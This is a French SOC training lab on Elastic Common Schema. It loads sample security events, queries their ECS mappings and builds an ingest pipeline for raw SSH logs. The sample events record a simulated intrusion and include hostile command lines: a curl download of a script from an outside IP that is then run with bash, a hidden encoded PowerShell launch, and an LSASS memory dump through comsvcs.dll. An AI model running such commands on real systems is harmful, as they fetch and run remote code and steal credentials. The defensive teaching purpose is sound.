# TP 2 — Elastic Common Schema

> Lire des événements en ECS, retrouver leurs types dans le mapping, et normaliser une ligne de log brute avec un pipeline d'ingestion.

**Topic** : Elastic Common Schema

## Contexte

Un serveur SSH ancien envoie ses logs bruts, sans intégration. Avant de les mélanger aux autres sources, le SOC veut les voir **en ECS** — comme les événements du lab.

## Setup

Ce TP est autonome. Il utilise le **jeu de données du lab** : 25 événements ECS, dans le data stream `logs-lab-default`. Le pipeline `lab-replay` décale leurs dates, pour que le dernier ait eu lieu il y a 10 minutes — réglez le sélecteur de temps de Kibana sur **Last 4 hours**.

Envoyez ce bloc dans **Dev Tools** (le `DELETE` vide un éventuel chargement précédent) :

```json
DELETE /_data_stream/logs-lab-default

PUT /_ingest/pipeline/lab-replay
{
  "description": "Rejoue le jeu de données du lab : décale les événements pour que le dernier ait eu lieu il y a 10 minutes",
  "processors": [
    {
      "script": {
        "source": "ZonedDateTime ts = ZonedDateTime.parse(ctx['@timestamp']); long ms = ChronoUnit.MILLIS.between(ts, ZonedDateTime.parse(params.end)); ctx['@timestamp'] = metadata().now.minus(ms, ChronoUnit.MILLIS).toString();",
        "params": { "end": "2026-10-01T10:30:00Z" }
      }
    }
  ]
}

POST /logs-lab-default/_bulk?pipeline=lab-replay&refresh
{"create":{}}
{"@timestamp":"2026-10-01T07:55:00Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["authentication"],"type":["start"],"outcome":"success","dataset":"system.auth"},"user":{"name":"deploy"},"source":{"ip":"10.0.0.12"},"message":"Accepted publickey for deploy from 10.0.0.12 port 40022 ssh2"}
{"create":{}}
{"@timestamp":"2026-10-01T08:00:00Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["authentication"],"type":["start"],"outcome":"failure","dataset":"system.auth"},"user":{"name":"admin"},"source":{"ip":"203.0.113.50"},"message":"Failed password for admin from 203.0.113.50 port 52311 ssh2"}
{"create":{}}
{"@timestamp":"2026-10-01T08:00:10Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["authentication"],"type":["start"],"outcome":"failure","dataset":"system.auth"},"user":{"name":"admin"},"source":{"ip":"203.0.113.50"},"message":"Failed password for admin from 203.0.113.50 port 52321 ssh2"}
{"create":{}}
{"@timestamp":"2026-10-01T08:00:20Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["authentication"],"type":["start"],"outcome":"failure","dataset":"system.auth"},"user":{"name":"admin"},"source":{"ip":"203.0.113.50"},"message":"Failed password for admin from 203.0.113.50 port 52331 ssh2"}
{"create":{}}
{"@timestamp":"2026-10-01T08:00:30Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["authentication"],"type":["start"],"outcome":"failure","dataset":"system.auth"},"user":{"name":"admin"},"source":{"ip":"203.0.113.50"},"message":"Failed password for admin from 203.0.113.50 port 52341 ssh2"}
{"create":{}}
{"@timestamp":"2026-10-01T08:00:40Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["authentication"],"type":["start"],"outcome":"failure","dataset":"system.auth"},"user":{"name":"admin"},"source":{"ip":"203.0.113.50"},"message":"Failed password for admin from 203.0.113.50 port 52351 ssh2"}
{"create":{}}
{"@timestamp":"2026-10-01T08:01:00Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["authentication"],"type":["start"],"outcome":"success","dataset":"system.auth"},"user":{"name":"admin"},"source":{"ip":"203.0.113.50"},"message":"Accepted password for admin from 203.0.113.50 port 52400 ssh2"}
{"create":{}}
{"@timestamp":"2026-10-01T08:02:00Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"admin"},"process":{"name":"curl","command_line":"curl -s http://198.51.100.7/x.sh -o /tmp/x.sh","pid":4101,"parent":{"name":"bash"}}}
{"create":{}}
{"@timestamp":"2026-10-01T08:02:10Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"admin"},"process":{"name":"bash","command_line":"bash /tmp/x.sh","pid":4102,"parent":{"name":"bash"}}}
{"create":{}}
{"@timestamp":"2026-10-01T08:03:00Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"admin"},"process":{"name":"crontab","command_line":"crontab -l","pid":4110,"parent":{"name":"bash"}}}
{"create":{}}
{"@timestamp":"2026-10-01T09:58:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"alice"},"process":{"name":"winword.exe","command_line":"\"C:\\Program Files\\Microsoft Office\\WINWORD.EXE\" /n invoice.docm","pid":7001,"parent":{"name":"explorer.exe"}}}
{"create":{}}
{"@timestamp":"2026-10-01T10:00:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"alice"},"process":{"name":"powershell.exe","command_line":"powershell.exe -nop -w hidden -enc SQBFAFgA","pid":7300,"parent":{"name":"winword.exe"}}}
{"create":{}}
{"@timestamp":"2026-10-01T10:00:05Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"alice"},"process":{"name":"updater.exe","command_line":"C:\\Users\\alice\\AppData\\Local\\Temp\\updater.exe","pid":7312,"parent":{"name":"powershell.exe"}}}
{"create":{}}
{"@timestamp":"2026-10-01T10:01:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":512},"destination":{"ip":"198.51.100.7","port":443,"bytes":1024},"network":{"transport":"tcp","direction":"egress"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:02:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":512},"destination":{"ip":"198.51.100.7","port":443,"bytes":1024},"network":{"transport":"tcp","direction":"egress"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:03:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":512},"destination":{"ip":"198.51.100.7","port":443,"bytes":1024},"network":{"transport":"tcp","direction":"egress"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:04:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":512},"destination":{"ip":"198.51.100.7","port":443,"bytes":1024},"network":{"transport":"tcp","direction":"egress"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:05:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":512},"destination":{"ip":"198.51.100.7","port":443,"bytes":1024},"network":{"transport":"tcp","direction":"egress"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:06:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":512},"destination":{"ip":"198.51.100.7","port":443,"bytes":1024},"network":{"transport":"tcp","direction":"egress"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:03:30Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"chrome.exe","pid":5120},"source":{"ip":"10.0.0.42","bytes":2048},"destination":{"ip":"142.250.74.110","port":443,"bytes":88000},"network":{"transport":"tcp","direction":"egress"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:12:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"alice"},"process":{"name":"whoami.exe","command_line":"whoami /all","pid":7350,"parent":{"name":"updater.exe"}}}
{"create":{}}
{"@timestamp":"2026-10-01T10:12:30Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"alice"},"process":{"name":"net.exe","command_line":"net group \"Domain Admins\" /domain","pid":7351,"parent":{"name":"updater.exe"}}}
{"create":{}}
{"@timestamp":"2026-10-01T10:15:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":4096},"destination":{"ip":"10.0.0.20","port":445,"bytes":1024},"network":{"transport":"tcp","direction":"internal"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:16:00Z","host":{"name":"db-01","os":{"family":"windows"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"svc_backup"},"process":{"name":"rundll32.exe","command_line":"rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Temp\\l.dmp full","pid":8800,"parent":{"name":"services.exe"}}}
{"create":{}}
{"@timestamp":"2026-10-01T10:20:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":48000000},"destination":{"ip":"198.51.100.7","port":443,"bytes":2048},"network":{"transport":"tcp","direction":"egress"}}
```

Résultat attendu (extrait) :

```json
{ "errors": false }
```

## Exercice 1 — Lire un événement ECS

```json
POST /logs-lab-default/_search
{
  "size": 1,
  "query": { "term": { "event.outcome": "failure" } }
}
```

Repérez les field sets : `event`, `host`, `user`, `source`, et le `message` d'origine.

**Question** : quelles sont les valeurs de `event.category` et `event.outcome` ? Sont-elles libres ?

<details>
<summary>Réponse</summary>

`authentication` et `failure`. Non : ce sont des **valeurs autorisées** par ECS — c'est ce qui permet à une même requête de couvrir SSH, Windows et Okta.

</details>

## Exercice 2 — Les types ECS

```json
GET /logs-lab-default/_mapping/field/source.ip,event.category,source.bytes,@timestamp
```

**Question** : quel est le type de chaque champ ? Que permet le type de `source.ip` ?

<details>
<summary>Réponse</summary>

`ip`, `keyword`, `long`, `date`. Un champ `ip` accepte les requêtes **CIDR** :

```json
POST /logs-lab-default/_count
{
  "query": { "term": { "source.ip": "10.0.0.0/8" } }
}
```

Résultat attendu :

```json
{ "count": 10 }
```

</details>

## Exercice 3 — Une catégorie, toutes les sources

Comptez les événements par catégorie :

```json
POST /logs-lab-default/_search
{
  "size": 0,
  "aggs": {
    "categories": { "terms": { "field": "event.category" } }
  }
}
```

Résultat attendu (extrait) :

```json
{
  "aggregations": {
    "categories": {
      "buckets": [
        { "key": "process", "doc_count": 9 },
        { "key": "network", "doc_count": 9 },
        { "key": "authentication", "doc_count": 7 }
      ]
    }
  }
}
```

## Exercice 4 — Normaliser une ligne brute

Voici deux lignes du vieux serveur :

```text
Failed password for root from 198.51.100.23 port 40122 ssh2
Accepted password for backup from 10.0.0.30 port 50110 ssh2
```

Écrivez un pipeline qui en tire `user.name`, `source.ip`, `source.port` (un nombre), `event.category` (`authentication`) et `event.outcome` (`failure` ou `success`). Testez-le avec `_simulate` :

```json
POST /_ingest/pipeline/_simulate
{
  "pipeline": {
    "processors": [
      { "dissect": { "field": "message", "pattern": "%{_tmp.verb} password for %{user.name} from %{source.ip} port %{source.port} ssh2" } },
      { "convert": { "field": "source.port", "type": "long" } },
      { "set": { "field": "event.category", "value": ["authentication"] } },
      { "set": { "if": "ctx._tmp.verb == 'Failed'", "field": "event.outcome", "value": "failure" } },
      { "set": { "if": "ctx._tmp.verb == 'Accepted'", "field": "event.outcome", "value": "success" } },
      { "remove": { "field": "_tmp" } }
    ]
  },
  "docs": [
    { "_source": { "message": "Failed password for root from 198.51.100.23 port 40122 ssh2" } },
    { "_source": { "message": "Accepted password for backup from 10.0.0.30 port 50110 ssh2" } }
  ]
}
```

Résultat attendu (extrait) :

```json
{
  "docs": [
    { "doc": { "_source": { "user": { "name": "root" }, "source": { "ip": "198.51.100.23", "port": 40122 }, "event": { "outcome": "failure" } } } },
    { "doc": { "_source": { "user": { "name": "backup" }, "event": { "outcome": "success" } } } }
  ]
}
```

## Exercice 5 — Un data stream ECS pour cette source

Enregistrez le pipeline, puis un index template qui l'applique et qui mappe ECS :

```json
PUT /_ingest/pipeline/legacy-sshd
{
  "processors": [
    { "dissect": { "field": "message", "pattern": "%{_tmp.verb} password for %{user.name} from %{source.ip} port %{source.port} ssh2" } },
    { "convert": { "field": "source.port", "type": "long" } },
    { "set": { "field": "event.category", "value": ["authentication"] } },
    { "set": { "if": "ctx._tmp.verb == 'Failed'", "field": "event.outcome", "value": "failure" } },
    { "set": { "if": "ctx._tmp.verb == 'Accepted'", "field": "event.outcome", "value": "success" } },
    { "remove": { "field": "_tmp" } }
  ]
}

PUT /_index_template/logs-legacy
{
  "index_patterns": ["logs-legacy.*-*"],
  "data_stream": {},
  "composed_of": ["ecs@mappings"],
  "priority": 200,
  "template": {
    "settings": { "index.default_pipeline": "legacy-sshd" }
  }
}

POST /logs-legacy.sshd-default/_doc?refresh
{
  "@timestamp": "2026-10-01T08:30:00Z",
  "message": "Failed password for root from 198.51.100.23 port 40122 ssh2"
}

POST /logs-legacy.sshd-default/_search
{
  "query": { "term": { "source.ip": "198.51.100.0/24" } }
}
```

Résultat attendu (extrait) :

```json
{
  "hits": {
    "total": { "value": 1 }
  }
}
```

> Un `GET /logs-legacy.sshd-default/_mapping/field/source.ip` confirme le type `ip` : `ecs@mappings` l'a donné par le seul nom du champ.

## Exercice 6 — Les deux sources, une requête

```json
POST /logs-*/_count
{
  "query": {
    "bool": {
      "filter": [
        { "term": { "event.category": "authentication" } },
        { "term": { "event.outcome": "failure" } }
      ]
    }
  }
}
```

Résultat attendu :

```json
{ "count": 6 }
```

Les 5 échecs du lab et celui du vieux serveur : **une** requête, deux sources.

## Critères de succès

- [ ] Vous savez lire les field sets d'un événement ECS
- [ ] `source.ip` est de type `ip`, et une requête CIDR fonctionne
- [ ] Le pipeline `legacy-sshd` produit des événements ECS
- [ ] `logs-*` renvoie 6 échecs d'authentification

## Dépannage

| Symptôme | Cause probable | Solution |
|----------|----------------|----------|
| `source.port` reste une chaîne | `convert` manquant | Ajoutez le processeur `convert` |
| `event.outcome` absent | Le verbe n'est ni `Failed` ni `Accepted` | Regardez `_tmp.verb` avant le `remove` |
| `source.ip` de type `keyword` | Template non appliqué | Le nom du data stream doit suivre `logs-legacy.*-*` |

## Pour aller plus loin

- **Data quality** (Security → Dashboards) : vérifie que chaque index respecte ECS.
- **Automatic import** (Integrations) : un LLM propose le pipeline et le mapping ECS d'un échantillon de logs.
